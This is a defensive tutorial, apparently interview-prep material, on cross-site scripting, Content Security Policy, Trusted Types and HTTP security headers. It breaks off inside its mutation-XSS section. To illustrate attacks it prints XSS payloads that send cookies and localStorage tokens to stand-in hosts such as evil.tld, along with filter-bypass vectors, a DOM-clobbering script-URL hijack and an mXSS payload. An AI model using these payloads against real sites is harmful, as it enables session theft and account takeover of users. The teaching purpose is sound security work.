# Cross-Site Scripting (XSS), CSP & Security Headers

**Cross-Site Scripting (XSS)** is the class of vulnerabilities where an attacker gets
their own JavaScript to run in *your* origin, inside *your* victim's browser. Because that
script runs with the victim's identity and inside your security origin, it can read the
DOM, steal or ride on session cookies and tokens, make authenticated requests, keylog,
rewrite the page, and pivot into full account takeover. XSS has been on the OWASP Top 10
for two decades; in the 2021 edition it is folded into **A03:2021 – Injection** (XSS is
"just" injection into an HTML/JS execution context). It remains one of the most common and
most impactful web bugs.

This topic is **language- and framework-agnostic**. We teach the *mechanism* — how the
attacker's data reaches an execution context, and the *only* reliable fix: context-aware
output encoding plus a defense-in-depth wall of **Content Security Policy (CSP)** and
**HTTP security headers**. We describe attacks with concrete payloads and defenses with
concrete header syntax, not one framework's templating API.

> [!KEY-TAKEAWAY]
> There is one root cause and one root fix. **Root cause:** untrusted data is placed into
> a page such that the browser parses it as *code* (markup or script) instead of *text*.
> **Root fix:** encode/escape output for the *specific context* it lands in (HTML body,
> attribute, JS, URL, CSS), lean on framework auto-escaping, avoid dangerous sinks, and
> use CSP + Trusted Types as a second wall for when encoding is missed. Input validation
> and HttpOnly help but are **not** the primary fix.

## XSS Fundamentals

XSS occurs when an application takes data it does not fully control and includes it in a
response (or DOM) in a way that the browser interprets as executable content rather than
inert text. The classic proof-of-concept is `<script>alert(1)</script>`, but real
payloads exfiltrate data: `<script>new Image().src='//evil.tld/c?'+document.cookie</script>`
or `<script>fetch('//evil.tld',{method:'POST',body:localStorage.getItem('token')})</script>`.

Why it matters: injected script runs **in the victim's browser, in your origin**, so it
inherits everything the same-origin policy grants your page — cookies (unless `HttpOnly`),
`localStorage`/`sessionStorage`, the DOM, and the ability to send credentialed requests to
your APIs. XSS therefore defeats CSRF tokens (the script can read them), can bypass much of
MFA (it acts *after* login), and is a common first step to full account takeover.

The three traditional categories differ by **where the malicious data is stored and how it
reaches the page**: **stored**, **reflected**, and **DOM-based**. A useful orthogonal split
is **server-side XSS** (the injected markup is in the HTTP response body the server sends)
vs **client-side / DOM XSS** (the vulnerability is entirely in client JavaScript; the
server may never see the payload).

> [!INTERVIEW]
> "What can an attacker actually do with XSS?" A strong answer goes past `alert(1)`:
> session/token theft, silent authenticated requests (transfer money, change email/
> password), keylogging and phishing overlays, reading the DOM (CSRF tokens, PII), and
> using the foothold as a beachhead (BeEF-style). The severity is "arbitrary code
> execution in the user's session," which is why it is High/Critical, not cosmetic.

## Stored XSS

**Stored (persistent) XSS** happens when the malicious payload is saved by the application
(database, comment, profile field, log, filename, support ticket) and later served to other
users. It is the most dangerous variant because it needs no per-victim trickery: every user
who views the poisoned resource is attacked, enabling a **worm** (Samy on MySpace, 2005,
infected ~1M profiles in ~20 hours).

Vulnerable pattern: a comment field stores `Great post! <script>…</script>` verbatim, and
the page renders stored comments with no output encoding. Exploit: attacker posts the
comment once; every reader executes the script. Correct defense: **HTML-encode on output**
when rendering the comment (`<` → `&lt;`), not (only) on input, plus CSP.

> [!WARNING]
> "Sanitize on input and you're safe" is a trap. The same stored string may be rendered
> into many *different* contexts (HTML body, an attribute, a JSON blob, a JS string), each
> needing *different* encoding. Encoding must happen at the point of output, for that
> output's context. Store the raw data; encode when you emit it.

## Reflected XSS

**Reflected (non-persistent) XSS** occurs when data from the *current* request — a query
parameter, form field, or path segment — is echoed straight back into the response without
encoding. It is not stored; the payload lives in a crafted URL the attacker must trick the
victim into opening (phishing link, malicious ad).

Vulnerable pattern: a search page renders `You searched for: <the q parameter>` directly.
Exploit URL: `https://site.tld/search?q=<script>document.location='//evil.tld/?c='+document.cookie</script>`.
The victim clicks; the server reflects the script into the HTML; it runs in the site's
origin. Correct defense: context-aware output encoding of `q` before it enters the HTML,
plus CSP so an injected inline `<script>` is blocked even if encoding is missed.

Reflected XSS is often dismissed as lower-severity because it needs a lured click, but a
convincing link, an open redirect, or a widely-shared URL makes it very real.

## DOM-Based XSS: Source to Sink

**DOM-based XSS** is a client-side flaw: untrusted data flows from a **source** (something
the attacker influences, e.g. `location.hash`, `location.search`, `document.referrer`,
`window.name`, `postMessage` data) into a dangerous **sink** (an API that turns strings
into DOM/markup/code, e.g. `element.innerHTML`, `document.write`, `eval`, `setTimeout` with
a string, `location = …`, `el.setAttribute('onclick', …)`). The exploit executes purely in
JavaScript — **the payload may never reach the server**, so server-side WAFs and encoding
never see it, and it can hide entirely behind the URL fragment (`#…`) which browsers do not
send to the server.

Vulnerable pattern:
```js
// URL: https://site.tld/page#<img src=x onerror=alert(document.domain)>
document.getElementById('out').innerHTML = decodeURIComponent(location.hash.slice(1));
```
The `location.hash` **source** flows into the `innerHTML` **sink**; the `<img onerror>`
runs. Correct defense: don't build markup from untrusted strings — use `textContent`
instead of `innerHTML`; if HTML is required, sanitize with a vetted library (DOMPurify) or
enforce **Trusted Types**. Because the payload is in the fragment, the fix must be in the
client code, not the server.

> [!INTERVIEW]
> DOM-XSS is the "source → sink" question. Be able to name sources (`location.*`,
> `document.referrer`, `window.name`, `postMessage`) and sinks (`innerHTML`,
> `outerHTML`, `document.write`, `eval`, `Function`, `setTimeout`/`setInterval` with a
> string arg, `insertAdjacentHTML`, `el.src`/`el.href` for `javascript:` URLs). The fix
> is safe-sink usage + sanitization + Trusted Types, *not* server-side encoding.

## Execution Contexts and Output Encoding

The single most important XSS concept: **the correct encoding depends on the context** the
data lands in. HTML has several sub-grammars, and a value that is safe in one is dangerous
in another. This is why "just HTML-escape everything" is insufficient and why
context-*aware* encoding is the real fix (OWASP XSS Prevention Cheat Sheet).

| Context | Example | Encode |
|---|---|---|
| HTML element body | `<div>DATA</div>` | HTML-entity encode `< > & " '` |
| HTML attribute (quoted) | `<input value="DATA">` | attribute-encode; always quote attributes |
| Unquoted attribute | `<input value=DATA>` | **avoid** — space/`/`/`>` break out; quote it |
| JavaScript string | `<script>var x='DATA'</script>` | JS-string escape (`\xHH`), or emit as JSON |
| URL / query param | `<a href="/x?q=DATA">` | URL-encode (percent-encode) the value |
| CSS value | `<style>a{color:DATA}</style>` | CSS-escape; better: don't put user data in CSS |

### Worked example: one payload, inert in one context, code-execution in the other

Take the attacker value `</script><script>alert(1)</script>` and follow it into two places.

**Context A — HTML body, HTML-entity encoded.** Encoding turns `<`→`&lt;`, `>`→`&gt;`,
`/` stays, so the emitted markup is:
```
<div>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div>
```
The HTML parser decodes the entities back to the *characters* `</script><script>alert(1)</script>`
and paints them as visible text. No tag is created, nothing runs. **Inert — this is the right
encoding for this context.**

**Context B — JS string literal, escaped for JS only.** A developer emits the value inside a
script and reasons "it's a JS string, so I'll JS-escape the quotes and backslashes." That
escaping leaves `</script>` untouched (it contains no quote or backslash):
```
<script>var x='</script><script>alert(1)</script>';</script>
```
Now trace the browser: the HTML *tokenizer* runs **before** the JS lexer and, inside a
`<script>` element, scans the raw bytes for the literal sequence `</script>`. It finds one
immediately after `var x='`, so it **closes the script element right there** — `var x='` is a
syntactically incomplete (and ignored) script — and then parses the very next bytes,
`<script>alert(1)</script>`, as a brand-new script element that **executes**. JS-string
escaping never had a chance, because the breakout happens one parser layer up.

Same value, same "I encoded it" intent — inert in the HTML body, arbitrary code execution in
the script context. That is why the JS-context rule *also* mandates encoding `<`, `>`, `&`
(so `</script>` becomes `<\/script>` and never reaches the tokenizer as a close tag — see the
JS/JSON section), and why "just escape it" is meaningless without naming the context.

Two gotchas interviewers probe: (1) **encoding for the wrong context is still a vuln** —
HTML-encoding a value that is placed inside a `<script>` block does nothing to stop
`</script><script>…`. (2) **Nested contexts** (a URL inside an HTML attribute inside a JS
string) require layered encoding in the right order. This complexity is exactly why you
should let a framework/templating engine that understands contexts do the encoding.

> [!WARNING]
> Putting *any* untrusted data inside a `<script>` block, an inline event handler
> (`onclick="…"`), or a `javascript:` URI is dangerous even with encoding, because you're
> injecting into a scripting context. OWASP's rule: don't do it. Pass data via
> `data-*` attributes or a JSON island and read it with safe DOM APIs instead.

## Framework Auto-Escaping

Modern templating/UI frameworks (React JSX, Angular, Vue, most server template engines)
**auto-escape by default** for the HTML context: interpolating `{userData}` produces
escaped text, so the #1 defense against XSS in practice is "use the framework's default
rendering and don't fight it." React escapes string children; Angular treats interpolated
values as untrusted and sanitizes.

The interviewer's real target is the **escape hatches** that opt out of auto-escaping:

- React: `dangerouslySetInnerHTML={{__html: userData}}` — the name is a warning.
- Angular: `[innerHTML]` binding, or `bypassSecurityTrustHtml`/`…TrustScript`.
- Vue: `v-html`.
- Server templates: "raw"/"safe"/"unescaped" filters (`| safe`, `{{{ }}}`, `raw()`).

Any of these reintroduces XSS if fed untrusted data. Also note auto-escaping is usually
tuned for the HTML *body* context and does **not** automatically protect URL attributes
(`href="javascript:…"`), inline styles, or `<script>` blocks — those still need explicit
handling.

> [!INTERVIEW]
> "React is XSS-proof, right?" No. React auto-escapes text children, but
> `dangerouslySetInnerHTML`, unsanitized `href`/`src` (`javascript:` URLs), `<a target>`
> reverse-tabnabbing, `ref`-based direct DOM writes, and server-side rendering of
> attacker-controlled JSON into a `<script>` island all reopen the door.

## Input Validation as Defense in Depth

Input validation (allowlist what a field may contain — length, charset, format, e.g. a
zip code is digits) is valuable and part of ASVS, but it is **defense in depth, not the
primary XSS fix**. Reasons: many fields legitimately contain characters used in payloads
(names with apostrophes, comments with `<`, rich-text bios); the same value is rendered
into multiple contexts each needing different encoding; and validation cannot anticipate
every sink. Reject clearly-invalid input, but rely on **output encoding** for correctness.

For fields that must contain HTML (WYSIWYG editors, markdown), you cannot merely encode —
you must **sanitize**: parse the HTML and strip dangerous elements/attributes with a
robust, maintained library (DOMPurify client-side; OWASP Java HTML Sanitizer / equivalents
server-side). Never write your own HTML sanitizer with regexes — HTML parsing is full of
mutation and mXSS edge cases that hand-rolled filters miss.

> [!WARNING]
> Blocklist input filters (strip `<script>`, block `javascript:`) are trivially bypassed:
> `<img src=x onerror=…>`, `<svg onload=…>`, `<iframe srcdoc=…>`, mixed case, null bytes,
> HTML entities, `java\tscript:`, and mutation XSS all evade naive blocklists. Prefer
> allowlist validation for structure and *always* encode/sanitize on output.

## Dangerous Sinks

A **sink** is a browser API that converts a string into live DOM, markup, or code. Passing
untrusted data into one is the mechanism of DOM XSS. Know the list:

- **Markup sinks:** `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`/
  `document.writeln`, `DOMParser.parseFromString`, `Range.createContextualFragment`.
- **Code-execution sinks:** `eval`, `Function(...)`, `setTimeout("code",…)` /
  `setInterval("code",…)` with a *string*, `setAttribute('on…', …)` for event handlers.
- **URL/navigation sinks:** assigning a `javascript:` URL to `location`, `element.href`,
  `element.src`, `window.open`, or a form `action`.

Safe replacements: use `textContent`/`innerText` instead of `innerHTML`; build DOM with
`createElement` + `append`; pass a *function* (not a string) to `setTimeout`; never `eval`
JSON — use `JSON.parse`. If you truly need to inject HTML, run it through a sanitizer and/or
enforce Trusted Types so raw strings can't reach these sinks at all.

> [!KEY-TAKEAWAY]
> `element.textContent = userData` is safe (browser treats it as text);
> `element.innerHTML = userData` is dangerous (browser parses it as markup and runs
> `onerror`/`onload` handlers even though `<script>` inserted via innerHTML does *not*
> execute — the danger is event-handler attributes and other elements).

## Trusted Types

**Trusted Types** is a browser security mechanism (Chromium/CSP-based) that eliminates
**DOM-based XSS** by locking down the dangerous DOM sinks. When enabled via CSP, the
browser refuses to accept a plain string at an "injection sink" (`innerHTML`,
`script.src`, `eval`, etc.) — the value must be a typed object (`TrustedHTML`,
`TrustedScript`, `TrustedScriptURL`) produced by a **policy** you explicitly define and
register. This forces all string-to-DOM flows through a small, auditable choke point
(where you sanitize), instead of scattering safety across the codebase.

Enable it with headers:
```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default myPolicy;
```
`require-trusted-types-for 'script'` turns on enforcement at script sinks;
`trusted-types` names the allowed policy factories (`'none'` disallows any policy). A
default policy that runs DOMPurify converts every raw string assigned to `innerHTML` into
sanitized `TrustedHTML`. The security win: it changes the default from "any string can
reach a sink" to "only reviewed code can create trusted values," so a missed encoding
becomes a caught runtime error, not an exploit.

> [!INTERVIEW]
> Trusted Types addresses the *DOM XSS* half of the problem (client-side sinks); nonce/
> hash-based CSP addresses the *injected-script* half (server-reflected `<script>`).
> Google credits Trusted Types + strict CSP with dramatically reducing XSS across its
> products. Support is Chromium-based; use it as progressive enhancement, and keep
> output encoding as the baseline for non-supporting browsers.

## Content Security Policy Fundamentals

**Content Security Policy (CSP)** is a defense-in-depth HTTP response header (CSP Level 3)
that tells the browser which sources of script, style, images, frames, etc. are allowed to
load and execute. Its headline value: even if an attacker injects a `<script>` (i.e. your
encoding failed), a good CSP stops it from executing. CSP is a **second line of defense**,
not a replacement for output encoding.

The policy is a list of **directives**, each with a source list:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```
- `default-src` is the fallback for most `*-src` directives (script, style, img, connect,
  font, media, …) that you don't set explicitly. **It does not cover** `frame-ancestors`,
  `base-uri`, `form-action`, or `report-uri` — those must be set separately.
- `object-src 'none'` (kill Flash/plugin vectors) and `base-uri 'none'` (stop `<base>`
  hijacking of relative script URLs) are strongly recommended baselines.
- Two channels: `Content-Security-Policy` (enforce) and
  `Content-Security-Policy-Report-Only` (log violations without blocking) — use
  report-only to roll out a policy safely.

Keywords must be quoted: `'self'`, `'none'`, `'unsafe-inline'`, `'unsafe-eval'`,
`'nonce-…'`, `'strict-dynamic'`. Note CSP does **not** stop data exfiltration perfectly
(DNS prefetch, `navigator.sendBeacon` to allowed hosts, etc.) and is not a substitute for
fixing the underlying injection.

> [!WARNING]
> A common misconception: CSP blocks XSS. It **mitigates** the *execution* of injected
> script; it does nothing about the injection itself and can be bypassed if misconfigured
> (`unsafe-inline`, overly broad allowlists, JSONP/AngularJS gadgets on allowed hosts).
> Report a missing/weak CSP as defense-in-depth, and always fix the injection too.

## CSP Script Sources: nonces, hashes, unsafe-inline

The core of a script-focused CSP is **how you allow your own inline/loaded scripts while
blocking injected ones**. Options, worst to best:

- **`'unsafe-inline'`** — allows *all* inline `<script>` and inline event handlers. This
  effectively **disables CSP's XSS protection**, because an injected inline script is now
  allowed. Avoid it; its presence is a finding.
- **Host allowlist** (`script-src 'self' https://cdn.tld`) — allows scripts only from named
  origins. Better than `unsafe-inline` but brittle: bypassable via open JSONP endpoints,
  outdated AngularJS, or user-uploaded content on an allowed host (see next section).
- **Nonce** (`script-src 'nonce-r4nd0m'`) — the server generates a fresh, unpredictable,
  per-response random value, puts it in the header *and* on each legitimate tag
  (`<script nonce="r4nd0m">`). Injected scripts don't know the nonce, so they're blocked.
  The nonce **must be cryptographically random and unique per response** — a static or
  reused nonce is worthless.
- **Hash** (`script-src 'sha256-BASE64…'`) — the policy lists the base64 SHA-256/384/512
  of the exact inline script content. The browser hashes each inline block and allows only
  matching ones. Great for static inline scripts (no server-side per-request work); awkward
  when content changes.

### Worked example: watch the browser allow/block each tag

Suppose the server sends this header on a fresh response:
```
Content-Security-Policy: script-src 'nonce-Ab3xK9'
```
and renders one legitimate inline script, while an attacker has managed to reflect two of
their own `<script>` tags into the same page. The browser evaluates each `<script>` it
parses against the policy:

| Tag the parser encounters | nonce attribute vs header `Ab3xK9` | Verdict |
|---|---|---|
| `<script nonce="Ab3xK9">initApp()</script>` (your tag) | equal | **ALLOWED** — `initApp()` runs |
| `<script>steal()</script>` (injected) | none present | **BLOCKED** |
| `<script nonce="guess">steal()</script>` (injected) | `guess` ≠ `Ab3xK9` | **BLOCKED** |

The attacker can inject markup, but cannot inject the *right nonce*: it is a fresh ~128-bit
random value the server picked for this one response, so guessing it is infeasible and it is
gone by the next response.

**Hash variant.** For a static inline script the policy pins the digest of its exact bytes.
The inline block `console.log('hi')` has `SHA-256 = 1ohZFo3B9w3UOFBbfx6JSomkpkME90iPs1r/qXzvX7Y=`
(base64), so the header reads:
```
Content-Security-Policy: script-src 'sha256-1ohZFo3B9w3UOFBbfx6JSomkpkME90iPs1r/qXzvX7Y='
```
The browser computes SHA-256 over the script's characters, base64-encodes it, and allows the
block only on an exact match. Change a single byte — e.g. add a space, `console.log('hi') ` —
and the digest becomes a completely different value that no longer matches, so the browser
**blocks** it. That byte-exactness is why hashes are perfect for unchanging inline scripts and
painful for anything a template regenerates.

Nonce vs hash: **nonce** suits server-rendered pages that can inject a fresh value per
response; **hash** suits static content and CDNs/edge caching where you can't set a
per-request nonce. Both are vastly stronger than host allowlists.

> [!KEY-TAKEAWAY]
> `'unsafe-inline'` is ignored by the browser when a nonce or hash is present (CSP2+),
> so old browsers that don't understand nonces still get *some* policy while modern ones
> enforce the strong one — a common backward-compat trick: `script-src 'nonce-…'
> 'unsafe-inline'` (the `unsafe-inline` is a no-op where nonces are supported).

## strict-dynamic and Why Allowlist CSP Fails

Google's research (Weichselbaum et al., "CSP Is Dead, Long Live CSP", 2016) analyzed
billions of real policies and found the **host-allowlist model is broken**: ~94% of
allowlist CSPs were bypassable, because trusted CDNs host JSONP endpoints, Angular, and
other **script gadgets** an attacker can abuse to run code from an allowed origin. Building
and maintaining a correct allowlist is also operationally painful.

The recommended modern approach is a **strict, nonce-based CSP with `'strict-dynamic'`**:
```
Content-Security-Policy:
  script-src 'nonce-r4nd0m' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none'; base-uri 'none'
```
- `'strict-dynamic'` says: trust scripts loaded *by* an already-trusted (nonced) script,
  and **ignore host allowlists and `'unsafe-inline'`** in browsers that support it. This
  lets a nonced bootstrap loader pull in its dependencies without you enumerating every CDN
  host, while still blocking injected `<script src>` (it lacks the nonce and isn't loaded
  by trusted code).
- The trailing `https:` and `'unsafe-inline'` are **fallbacks** for older browsers that
  don't understand `strict-dynamic`; supporting browsers ignore them.

### Worked example: how trust propagates (and where it stops)

Policy: `script-src 'nonce-Ab3xK9' 'strict-dynamic'`. Trace two script loads on the page:

1. `<script nonce="Ab3xK9" src="/bootstrap.js">` — nonce matches → **allowed**. It becomes a
   *trusted* script.
2. Inside `bootstrap.js`: `const s = document.createElement('script'); s.src = 'https://cdn.tld/dep.js'; document.head.appendChild(s);`
   → **allowed**. `dep.js` carries no nonce, but it was created *by* already-trusted code, and
   `'strict-dynamic'` propagates that trust to scripts a trusted script inserts. The chain
   continues: if `dep.js` in turn injects `plugin.js`, that is allowed too.
3. Attacker reflects `<script src="https://cdn.tld/evil.js"></script>` straight into the HTML
   → **BLOCKED**. It has no nonce, and it was inserted by the HTML *parser*, not by trusted
   code — so `'strict-dynamic'` never blesses it.

Now contrast the old host-allowlist version, `script-src 'self' https://cdn.tld`: step 3's
`evil.js` comes from `cdn.tld`, which is on the allowlist, so it would be **allowed** — the
attacker wins just by picking a script URL on any allowlisted host. `'strict-dynamic'` closes
exactly that hole: origin no longer matters, *who inserted the script* does.

This is the policy OWASP and Google recommend: it's easier to maintain (no host list),
harder to bypass, and scales. Add `require-trusted-types-for 'script'` to also close DOM
XSS.

> [!INTERVIEW]
> "Why is `script-src 'self' https://apis.google.com` weak?" Because allowlisted hosts
> often expose JSONP or framework gadgets (`https://apis.google.com/...callback=alert`),
> letting an attacker execute arbitrary code from an *allowed* origin. Answer with
> nonce + `strict-dynamic` as the fix, and cite the "CSP Is Dead" study.

## CSP Reporting

CSP can **report** violations so you can monitor attacks and roll out policies without
breaking the site. Two mechanisms:

- **`report-uri /csp-endpoint`** (older, widely supported): the browser POSTs a JSON
  violation report to the URL when a directive is violated.
- **`report-to <group>`** (newer, Reporting API): references a group defined in the
  `Report-To` (now `Reporting-Endpoints`) header; supersedes `report-uri`. For
  compatibility you often send **both**.

Combine with **`Content-Security-Policy-Report-Only`**: deploy the intended strict policy
in report-only mode first, watch the violation stream for legitimate resources you forgot,
fix the policy, *then* switch to enforcing. Reports are also an early-warning signal of XSS
attempts in production. Beware report noise from browser extensions injecting content.

> [!TIP]
> Rollout recipe: (1) ship `Content-Security-Policy-Report-Only` with your target strict
> policy + a report endpoint; (2) triage reports, whitelist genuine gaps (or better, add
> nonces); (3) flip to `Content-Security-Policy` (enforce) once the report stream is clean.

## HSTS and Preload

**HTTP Strict Transport Security (HSTS)** — the `Strict-Transport-Security` response header
— tells the browser to only ever connect to this host over HTTPS for a given duration,
even if the user types `http://` or clicks an `http` link. It defeats **SSL-stripping**
man-in-the-middle attacks (sslstrip) that downgrade the first, cleartext request.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```
- `max-age` (seconds) — how long the browser remembers to force HTTPS (2 years is the
  common preload requirement; don't start with a huge value if unsure).
- `includeSubDomains` — apply to every subdomain (all must support HTTPS).
- `preload` — opt-in to the browser **HSTS preload list** (hstspreload.org), baked into
  browsers so even the *first-ever* request is forced HTTPS, closing the trust-on-first-use
  gap. Requires `max-age ≥ 31536000`, `includeSubDomains`, and `preload`. Preloading is
  **hard to undo** and propagates slowly — commit deliberately.

Gotchas: HSTS is ignored over plain HTTP (must be sent on an HTTPS response) and does not
apply to the very first visit unless preloaded. It protects transport, not application
bugs.

> [!WARNING]
> `includeSubDomains` + `preload` is a foot-gun if any subdomain (internal tools, legacy
> apps) can't do HTTPS — they become unreachable in browsers. Roll out with a short
> `max-age` first, verify, then raise it and add `preload`.

## X-Content-Type-Options nosniff

`X-Content-Type-Options: nosniff` disables browser **MIME sniffing** — the legacy behavior
where a browser ignores the declared `Content-Type` and guesses based on content. Sniffing
enabled attacks where a file uploaded/served as `text/plain` or an image is re-interpreted
as `text/html` or `application/javascript` and executed, turning a benign upload into
stored XSS.

With `nosniff`, the browser honors the declared type: a response must be `text/html` to be
rendered as HTML and must have a JS MIME type to be loaded as a `<script>`. This is a
one-line, no-downside header you should send on **every** response. It also enables
Cross-Origin-Read-Blocking (CORB) protections.

> [!TIP]
> `nosniff` only helps if you *also* send correct `Content-Type` headers. Serve
> user-uploaded files with an accurate, restrictive content type (and ideally from a
> separate, cookieless origin) so they can't be coerced into executing.

## Referrer-Policy

The `Referrer-Policy` header controls how much of the current URL is sent in the `Referer`
header on outbound requests and navigations. This is a **privacy and leakage** control:
full referrers can leak session tokens embedded in URLs, internal paths, or PII to third
parties and analytics.

Common values (least to most leaky):
- `no-referrer` — never send it.
- `same-origin` — send full URL to same origin, nothing cross-origin.
- `strict-origin` — send only the origin (scheme+host), and nothing on HTTPS→HTTP downgrade.
- **`strict-origin-when-cross-origin`** — full URL same-origin, origin-only cross-origin,
  nothing on downgrade. This is the modern **browser default** and a good baseline.
- `unsafe-url` — always send the full URL, including cross-origin. Avoid.

> [!KEY-TAKEAWAY]
> Never put secrets (session IDs, tokens, password-reset codes) in URLs in the first
> place — Referer leakage, browser history, server logs, and shared links all expose them.
> `Referrer-Policy` reduces the blast radius but is not a substitute for keeping secrets
> out of URLs.

## Clickjacking: X-Frame-Options vs frame-ancestors

**Clickjacking** frames your site invisibly (transparent iframe over attacker UI) and
tricks users into clicking sensitive actions ("UI redressing"). Two headers defend:

- **`X-Frame-Options`** (legacy): `DENY` (never framed) or `SAMEORIGIN` (only same-origin
  frames). The `ALLOW-FROM uri` value is **deprecated/poorly supported** — don't rely on
  it. It's a whole-page, single-value control.
- **`Content-Security-Policy: frame-ancestors`** (modern, CSP Level 2/3): the replacement.
  `frame-ancestors 'none'` = deny all framing (like `DENY`); `frame-ancestors 'self'` =
  same-origin only; `frame-ancestors 'self' https://partner.tld` = allow specific origins
  (multiple allowed, unlike X-Frame-Options). `frame-ancestors` is **not** governed by
  `default-src` and must be set explicitly.

Guidance: set **both** for coverage — `frame-ancestors` for modern browsers, and
`X-Frame-Options: DENY`/`SAMEORIGIN` as a fallback for old ones. Where they conflict,
modern browsers prefer `frame-ancestors`.

> [!INTERVIEW]
> "X-Frame-Options vs frame-ancestors?" `frame-ancestors` supersedes X-Frame-Options,
> supports multiple allowed origins, and is part of CSP. Keep X-Frame-Options only as a
> legacy fallback. Neither is set by `default-src`. Framing controls are separate from
> CSRF defenses (SameSite / tokens) — clickjacking rides a *framed* real session.

## Permissions-Policy

`Permissions-Policy` (formerly `Feature-Policy`) lets a site declare which **powerful
browser features** (camera, microphone, geolocation, USB, payment, fullscreen,
accelerometer, etc.) may be used, and by which origins — including in embedded iframes.
This shrinks the attack surface: even if XSS or a malicious embed occurs, it can't silently
turn on the camera or geolocation if the policy forbids it.

```
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(self)
```
- `feature=()` — an empty allowlist disables the feature for everyone (including self).
- `feature=(self)` — allow only the top-level origin.
- `feature=(self "https://embed.tld")` — allow self and a specific embed.

It is a hardening/defense-in-depth header, not a direct XSS fix, but disabling unused
capabilities is good hygiene and limits what a compromised page or third-party script/
iframe can abuse.

## HttpOnly and the Limits of Cookie-Theft Defense

The **`HttpOnly`** cookie attribute makes a cookie inaccessible to JavaScript
(`document.cookie` can't read it). This blocks the classic XSS payload that exfiltrates the
session cookie: `new Image().src='//evil/?'+document.cookie` can no longer read an HttpOnly
session cookie. Every session cookie should be `HttpOnly` (plus `Secure` and `SameSite`).

But understand the **limits** — this is the interviewer's trap: `HttpOnly` stops *reading*
the cookie value, it does **not** stop XSS from *using* the session. Injected script can
still make credentialed same-origin requests: the browser attaches the HttpOnly cookie
automatically, so the attacker rides the session (transfer funds, change email) without
ever seeing the cookie. It also does nothing for tokens stored in `localStorage`
(fully JS-readable — a reason some argue against storing bearer tokens there).

> [!KEY-TAKEAWAY]
> `HttpOnly` reduces the *impact* of XSS (no cookie exfiltration / offline replay) but
> does **not** prevent XSS or stop an in-page attacker from acting as the user. The real
> fix is preventing XSS (output encoding, CSP, Trusted Types). Treat HttpOnly as one layer,
> and never store session tokens somewhere JS can read them if you can avoid it.

## DOM Clobbering

**DOM clobbering** is a scriptless injection technique: when an attacker can inject
*named* HTML (elements with `id` or `name` attributes) but **cannot** inject `<script>` or
event handlers (a sanitizer stripped them), they abuse a legacy DOM behavior — named
elements are exposed as properties on `document`, `window`, and their parent form/collection
— to **overwrite JavaScript variables, globals, and object properties** with element
references. This turns an HTML-only injection into a logic-corruption primitive that can
defeat security checks or hijack script URLs, all without executing any injected script.

Classic vectors:
- `<a id=x>` makes `window.x` resolve to that anchor element. Two same-`id` anchors form a
  collection, and a nested `name` lets you reach a *property*: `<a id=x><a id=x name=url
  href="//evil/e.js">` makes `window.x.url` a string-coercible value the attacker controls.
  If code does `var s = document.createElement('script'); s.src = window.x.url` you now
  control a script source **on an allowlisted, nonced page** — a CSP bypass.
- `<form><input id=attributes>` clobbers `form.attributes` (normally a `NamedNodeMap`), so a
  sanitizer loop like `for (const a of node.attributes)` throws or misbehaves — a way to
  **defeat filter code**.
- Clobbering `document.body`, `document.getElementById`, or config globals a page reads with
  the `var x = window.x || {}` idiom (the injected element wins over the undefined global).

Defenses (OWASP DOM Clobbering Prevention Cheat Sheet):
- Verify types before trusting DOM lookups: `if (!(node.attributes instanceof NamedNodeMap))
  throw`; check `typeof x === 'expected'`.
- Don't rely on named-property access for security-relevant values; use explicit
  `document.getElementById` results and validate them.
- Sanitize with DOMPurify's default `SANITIZE_DOM` plus `SANITIZE_NAMED_PROPS: true`, which
  prefixes `id`/`name` values with `user-content-` so injected names can't collide with real
  properties. Ban `id`/`name` on untrusted HTML where feasible.
- Freeze critical globals; use scoped variables/modules instead of `window`-level config.

> [!INTERVIEW]
> "The sanitizer strips `<script>` and every `on*` handler — you can only inject plain tags
> with `id`/`name`. Get code execution." Answer: **DOM clobbering** — inject
> `<a id=x><a id=x name=url href=//evil/x.js>` (or clobber `document.currentScript.src`
> style flows / a `base`-relative loader) so a legitimate script picks up your URL, or
> clobber `attributes`/a config global to bypass a check. It's the canonical "no script
> injection — now what?" senior question.

## Mutation XSS (mXSS) Internals

Intuition first: think of the browser's HTML parser as *autocorrect that rewrites your text
every time it re-reads it*. The sanitizer reads "version 1" of the markup, decides it is
clean, and hands it off — but the browser silently rewrites it into "version 2" on insertion,
and version 2 is executable. The sanitizer approved a string that no longer exists by the time
the page runs it.

Here is a concrete before/after. Suppose a sanitizer allows `<style>` and `<a>` and receives
this inside an SVG (foreign-content) context:
```
<svg><style><a title="</style><img src=x onerror=alert(1)>">
```
Parsed *as SVG*, `<style>` is a foreign-content element and its contents are treated as inert
text, so the sanitizer sees a `<style>` node whose text is `<a title="</style><img ...>"` — no
`<img>`, no event handler, **looks clean, approved**. But when that subtree is re-serialized
and re-parsed into the *HTML* namespace (what happens when it's assigned to `innerHTML` in a
normal HTML document), `<style>` is now HTML rawtext: the parser ends the style element at the
literal `</style>`, and the trailing bytes are re-read as HTML markup — materializing a real
`<img src=x onerror=alert(1)>` that **fires**. The dangerous element was never in the version
the sanitizer inspected; the parser *created* it on reinsertion.

**Mutation XSS (mXSS)** exploits the fact that the browser's HTML parser is *not*
idempotent: when you assign a string to `innerHTML`, the browser parses it, and when that
subtree is later **re-serialized and re-parsed** (or normalized on insertion), the markup
can *mutate* into a different, executable shape. A sanitizer that inspected the string (or
even a parsed tree) *before* this mutation approves markup that becomes dangerous *after*
it. This is precisely why "never write your own sanitizer" and "sanitization is not
idempotent — don't re-serialize sanitizer output" are true.

The main mutation engines:
- **Foreign-content namespace confusion.** HTML, SVG, and MathML have different parsing
  rules, and "integration points" switch the parser between them. Inside `<svg>`,
  `<math>`, or `<annotation-xml encoding="text/html">`, elements like `<style>`, `<mtext>`,
  `<title>`, or `<textarea>` are parsed differently than in HTML; re-serialization can move
  content across the boundary so that what was inert CDATA/text becomes live HTML. Payloads
  built around `<svg><style>...`, `<math><mtext><table>...`, and
  `<annotation-xml encoding="text/html">` are the classic mXSS engines.
- **Rawtext / escapable-rawtext breakouts** (`<noscript>`, `<style>`, `<title>`,
